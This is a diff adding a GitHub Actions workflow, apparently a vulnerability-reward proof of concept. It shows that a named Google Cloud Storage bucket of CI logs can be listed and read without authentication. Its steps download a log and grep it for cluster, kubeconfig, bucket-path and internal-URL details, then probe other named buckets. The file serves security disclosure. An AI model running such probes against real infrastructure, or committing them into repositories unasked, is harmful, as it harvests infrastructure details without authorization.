@@ -1,0 +1,120 @@
+# PoC: Public GCS Bucket Exposure in google/oss-fuzz-gen
+# The Cloud Build logs bucket gs://oss-fuzz-gen-ci-logs is publicly
+# listable and readable without authentication.
+#
+# Google VRP authorized security research.
+
+name: "PoC: Public GCS Bucket Exposure"
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  gcs-bucket-poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "Test: Bucket listing without authentication"
+        run: |
+          echo "=== Testing public access to gs://oss-fuzz-gen-ci-logs ==="
+          echo "This bucket is referenced in google/oss-fuzz-gen ci/cloudbuild.yaml as:"
+          echo '  logsBucket: gs://oss-fuzz-gen-ci-logs'
+          echo ""
+
+          HTTP_CODE=$(curl -s -o /tmp/bucket-listing.xml -w "%{http_code}" \
+            "https://storage.googleapis.com/oss-fuzz-gen-ci-logs/")
+
+          echo "HTTP Status: $HTTP_CODE"
+          echo ""
+
+          if [ "$HTTP_CODE" = "200" ]; then
+            echo "!!! PUBLIC ACCESS CONFIRMED !!!"
+            echo "!!! Bucket is listable WITHOUT authentication !!!"
+            echo ""
+
+            # Count files
+            FILE_COUNT=$(grep -c '<Key>' /tmp/bucket-listing.xml || echo "0")
+            echo "Files visible in first page: $FILE_COUNT"
+
+            # Check if truncated (more pages available)
+            IS_TRUNCATED=$(grep -o '<IsTruncated>[^<]*' /tmp/bucket-listing.xml | sed 's/<IsTruncated>//')
+            echo "Listing truncated (more pages): $IS_TRUNCATED"
+
+            # Show date range
+            echo ""
+            echo "=== Date range of exposed logs ==="
+            EARLIEST=$(grep -oP '<LastModified>[^<]+' /tmp/bucket-listing.xml | sort | head -1 | sed 's/<LastModified>//')
+            LATEST=$(grep -oP '<LastModified>[^<]+' /tmp/bucket-listing.xml | sort | tail -1 | sed 's/<LastModified>//')
+            echo "Earliest: $EARLIEST"
+            echo "Latest: $LATEST"
+
+            # Show sample file names
+            echo ""
+            echo "=== Sample log files ==="
+            grep -oP '<Key>[^<]+</Key>' /tmp/bucket-listing.xml | sed 's/<[^>]*>//g' | head -5
+            echo "..."
+            grep -oP '<Key>[^<]+</Key>' /tmp/bucket-listing.xml | sed 's/<[^>]*>//g' | tail -5
+          else
+            echo "Bucket is not publicly accessible (HTTP $HTTP_CODE)"
+            echo "The vulnerability may have been fixed."
+          fi
+
+      - name: "Test: Read individual log file without authentication"
+        run: |
+          echo "=== Reading a Cloud Build log file ==="
+          # Get the first step-3 log (CI container execution)
+          STEP3_LOG=$(grep -oP '<Key>[^<]+step-3[^<]*</Key>' /tmp/bucket-listing.xml | sed 's/<[^>]*>//g' | head -1)
+
+          if [ -n "$STEP3_LOG" ]; then
+            echo "Reading: $STEP3_LOG"
+            echo ""
+            curl -s "https://storage.googleapis.com/oss-fuzz-gen-ci-logs/$STEP3_LOG" > /tmp/log-content.txt
+
+            echo "=== Infrastructure details exposed ==="
+            echo ""
+
+            echo "--- GKE cluster info ---"
+            grep -i 'cluster\|kubeconfig\|kubectl' /tmp/log-content.txt | head -5 || echo "(none)"
+            echo ""
+
+            echo "--- GCS bucket paths ---"
+            grep -i 'gs://' /tmp/log-content.txt | head -5 || echo "(none)"
+            echo ""
+
+            echo "--- Experiment configurations ---"
+            grep -i 'experiment\|benchmark\|model\|llm' /tmp/log-content.txt | head -5 || echo "(none)"
+            echo ""
+
+            echo "--- Internal URLs ---"
+            grep -oP 'https?://[^\s"]+' /tmp/log-content.txt | sort -u | head -10 || echo "(none)"
+          else
+            echo "No step-3 logs found in listing."
+            # Fall back to any log file
+            ANY_LOG=$(grep -oP '<Key>[^<]+\.txt</Key>' /tmp/bucket-listing.xml | sed 's/<[^>]*>//g' | head -1)
+            if [ -n "$ANY_LOG" ]; then
+              echo "Reading: $ANY_LOG"
+              curl -s "https://storage.googleapis.com/oss-fuzz-gen-ci-logs/$ANY_LOG" | head -30
+            fi
+          fi
+
+      - name: "Test: Verify other buckets are NOT public (control test)"
+        run: |
+          echo "=== Control test: other referenced buckets ==="
+          echo ""
+
+          for bucket in oss-fuzz-gcb-experiment-run-logs oss-fuzz-coverage clusterfuzz-builds; do
+            HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+              "https://storage.googleapis.com/$bucket/")
+            echo "$bucket: HTTP $HTTP_CODE"
+          done
+
+          echo ""
+          echo "Expected: 403 (Access Denied) for properly secured buckets"
+          echo "oss-fuzz-gen-ci-logs returned 200 — this is the vulnerability"
